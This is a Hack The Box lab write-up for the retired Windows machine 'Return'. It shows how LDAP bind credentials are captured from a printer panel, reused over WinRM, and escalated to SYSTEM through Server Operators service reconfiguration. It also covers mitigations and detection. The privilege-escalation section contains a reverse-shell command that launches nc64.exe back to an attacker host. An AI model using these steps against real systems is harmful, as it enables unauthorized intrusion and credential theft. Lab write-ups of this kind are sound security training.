---
machine: Return
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [windows, active-directory, ldap, winrm, server-operators, service-abuse]
---

# Return — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (27 Sep 2021). Reference writeup; not played on this profile.
> No flags or real credentials.

## TL;DR

A printer administration panel lets you configure the LDAP server. When the connection test runs, the application sends a *bind* to the attacker's IP and exposes the service credentials. Those credentials work over WinRM; the account belongs to **Server Operators**, which can reconfigure a service binary and run it as SYSTEM.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,53,80,88,135,139,389,445,593,3268,3389,5985 <TARGET_IP>
```

| Port | Service | Note |
|---|---|---|
| 80/tcp | HTTP | PHP printer panel |
| 88/tcp | Kerberos | `return.local` DC |
| 389/tcp | LDAP | Directory |
| 445/tcp | SMB | Signing required |
| 5985/tcp | WinRM | Remote access |

```bash
echo "<TARGET_IP> return.local printer.return.local" | sudo tee -a /etc/hosts
```

## Enumeration

- `http://return.local/` shows a printer administration panel.
- `settings.php` lets you change the LDAP server, user and password.
- `feroxbuster` confirms `settings.php` and the rest of the app.
- `smbclient -L` cannot list shares unauthenticated, but confirms the `return.local` domain.

## Foothold

### 1. Capture the LDAP bind

Start a listener on port 389 and point the panel at the attacker IP:

```bash
sudo nc -lvnp 389
```

In `settings.php`, enter `<LHOST>` as the LDAP server and click **Test**. The app sends a `bindRequest` with the service user and password. The listener shows them in cleartext.

### 2. Validate the credentials

```bash
nxc smb <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>' -d return.local
nxc winrm <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>' -d return.local
```

WinRM returns `Pwn3d!`: the account can open a remote session.

```bash
evil-winrm -i <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>'
```

## Lateral movement

- No pivot: the web panel and the DC are the same host.
- The service account is reused over WinRM and SMB.
- `whoami /groups` confirms membership in **Server Operators**, a group that can start and stop services on the DC.

## Privilege escalation

`Server Operators` allows service configuration changes. Point an existing service at a reverse shell and start it:

```cmd
sc.exe qc VSS
sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe start VSS
```

The service may return error 1053; the shell often arrives anyway because `cmd.exe` already spawned the child process. The listener gets `nt authority\system`.

## Evidence

- `settings.php` with a controllable LDAP server field.
- `nc` showing the `bindRequest` with user and password.
- `nxc winrm` returning `Pwn3d!`.
- `whoami /groups` showing `Server Operators`.
- `sc qc` before and after the `binPath` change.

## Lessons learned

- An admin panel that lets you set an arbitrary LDAP server is a credential source.
- Service accounts often reuse passwords across LDAP, SMB and WinRM.
- `Server Operators` is effectively administrative on a DC: Domain Admin is not required to execute code as SYSTEM.
- Reconfiguring an existing service is quieter than creating one, but still leaves 7045/4697 events and registry changes.

## Mitigations and detection

- Do not let printer panels or web apps choose an arbitrary LDAP server; use an allowlist and read-only credentials.
- Rotate the `svc-printer` password and restrict its logon to required hosts.
- Restrict `Server Operators` to human accounts and audit changes.
- Detection: **4624** type 3/10 from the web host, **4672** with service privileges, **7045** and **4697** for service changes, and outbound port 389 connections from the DC.

MITRE: T1557, T1078.002, T1543.003, T1021.001.

## References

- <https://0xdf.gitlab.io/2022/05/05/htb-return.html>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups>
- <https://attack.mitre.org/techniques/T1543/003/>
